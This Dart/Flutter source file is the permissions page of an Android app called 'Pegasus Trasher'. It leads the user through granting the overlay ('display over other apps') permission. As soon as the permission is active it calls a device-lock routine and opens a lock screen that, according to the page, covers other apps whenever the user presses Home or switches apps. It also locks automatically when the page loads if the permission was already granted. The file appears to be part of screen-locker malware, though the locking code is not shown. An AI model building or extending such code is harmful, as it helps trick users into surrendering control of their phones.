import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'lock_screen.dart';
import 'utils/device_locker.dart';

class PermissionsPage extends StatefulWidget {
  const PermissionsPage({super.key});

  @override
  _PermissionsPageState createState() => _PermissionsPageState();
}

class _PermissionsPageState extends State<PermissionsPage> {
  bool _isGranted = false;
  bool _isProcessing = false;
  bool _showManualGuide = false;

  @override
  void initState() {
    super.initState();
    _checkPermission();
  }

  Future<void> _checkPermission() async {
    final status = await Permission.systemAlertWindow.status;
    print('Overlay permission status: $status');
    
    if (status.isGranted) {
      _activateLock();
    }
  }

  Future<void> _grantPermission() async {
    if (_isProcessing) return;
    
    setState(() => _isProcessing = true);
    
    final status = await Permission.systemAlertWindow.request();
    print('Permission request result: $status');
    
    if (status.isGranted) {
      setState(() {
        _isGranted = true;
        _showManualGuide = false;
      });
      await Future.delayed(const Duration(milliseconds: 800));
      _activateLock();
    } else {
      setState(() {
        _isProcessing = false;
        _showManualGuide = true;
      });
    }
  }

  Future<void> _activateLock() async {
    DeviceLocker.lockDevice();
    
    if (mounted) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const LockScreen()),
      );
    }
  }

  Widget _buildManualGuide() {
    return Container(
      margin: const EdgeInsets.only(top: 20),
      padding: const EdgeInsets.all(15),
      decoration: BoxDecoration(
        color: Colors.red.withOpacity(0.1),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: Colors.red),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            '⚠️ MANUAL SETUP REQUIRED',
            style: TextStyle(
              color: Colors.red,
              fontWeight: FontWeight.bold,
              fontSize: 14,
            ),
          ),
          const SizedBox(height: 8),
          const Text(
            'Android requires manual permission setup:',
            style: TextStyle(color: Colors.white70),
          ),
          const SizedBox(height: 10),
          _buildStep('1. Tap "OPEN SETTINGS" below'),
          _buildStep('2. Find "Display over other apps"'),
          _buildStep('3. Enable for Pegasus Trasher'),
          _buildStep('4. Return to this app'),
          const SizedBox(height: 15),
          Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              ElevatedButton(
                onPressed: () => openAppSettings(),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.red,
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
                ),
                child: const Row(
                  children: [
                    Icon(Icons.settings, size: 18),
                    SizedBox(width: 8),
                    Text('OPEN SETTINGS'),
                  ],
                ),
              ),
              const SizedBox(width: 10),
              TextButton(
                onPressed: () => setState(() => _showManualGuide = false),
                child: const Text('DISMISS'),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildStep(String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text('• ', style: TextStyle(color: Colors.blueAccent)),
          Expanded(child: Text(text, style: const TextStyle(color: Colors.white70))),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A2463),
      body: Center(
        child: Container(
          width: 400,
          constraints: const BoxConstraints(maxWidth: 400),
          padding: const EdgeInsets.all(30),
          decoration: BoxDecoration(
            color: const Color(0xFF1E3A8A),
            borderRadius: BorderRadius.circular(20),
            boxShadow: [
              BoxShadow(
                color: Colors.blue[900]!.withOpacity(0.5),
                blurRadius: 30,
                spreadRadius: 5,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(
                Icons.layers,
                size: 80,
                color: _isGranted ? Colors.green : Colors.blueAccent,
              ),
              const SizedBox(height: 20),
              Text(
                _isGranted ? 'PERMISSION GRANTED!' : 'OVERLAY PERMISSION',
                style: const TextStyle(
                  fontSize: 22,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 1.5,
                ),
              ),
              const SizedBox(height: 10),
              Text(
                _isGranted 
                    ? 'Lock screen will appear over other apps'
                    : 'Required to display lock screen overlay',
                textAlign: TextAlign.center,
                style: const TextStyle(
                  color: Colors.blueGrey,
                  fontSize: 14,
                ),
              ),
              const SizedBox(height: 40),
              
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: _isGranted
                      ? Colors.green.withOpacity(0.15)
                      : const Color(0xFF0F3460),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(
                    color: _isGranted ? Colors.green : Colors.blueAccent,
                    width: 2,
                  ),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 50,
                      height: 50,
                      decoration: BoxDecoration(
                        color: _isGranted ? Colors.green : Colors.blueAccent,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(
                        _isGranted ? Icons.check : Icons.layers,
                        color: Colors.white,
                        size: 24,
                      ),
                    ),
                    const SizedBox(width: 15),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text(
                            'Display Over Other Apps',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 16,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                          const SizedBox(height: 5),
                          Text(
                            _isGranted 
                                ? '✓ Permission active - Lock screen enabled'
                                : 'Allows app to show on top of other apps',
                            style: TextStyle(
                              color: _isGranted ? Colors.greenAccent : Colors.blueGrey,
                              fontSize: 13,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
              
              const SizedBox(height: 40),
              
              if (!_isGranted && !_showManualGuide)
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton(
                    onPressed: _isProcessing ? null : _grantPermission,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF3B82F6),
                      padding: const EdgeInsets.symmetric(vertical: 18),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                    ),
                    child: _isProcessing
                        ? const SizedBox(
                            height: 20,
                            width: 20,
                            child: CircularProgressIndicator(
                              color: Colors.white,
                              strokeWidth: 2,
                            ),
                          )
                        : const Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(Icons.lock_open),
                              SizedBox(width: 10),
                              Text(
                                'GRANT OVERLAY PERMISSION',
                                style: TextStyle(
                                  fontSize: 16,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                  ),
                ),
              
              if (_isGranted)
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton(
                    onPressed: () => _activateLock(),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.green,
                      padding: const EdgeInsets.symmetric(vertical: 18),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                    ),
                    child: const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.play_arrow),
                        SizedBox(width: 10),
                        Text(
                          'START LOCK SCREEN',
                          style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              
              if (_showManualGuide) _buildManualGuide(),
              
              const SizedBox(height: 25),
              const Divider(color: Colors.blueGrey),
              const SizedBox(height: 15),
              const Text(
                'Note: After granting permission, lock screen will appear\nwhen you press Home button or switch apps',
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: Colors.blueGrey,
                  fontSize: 11,
                  fontStyle: FontStyle.italic,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
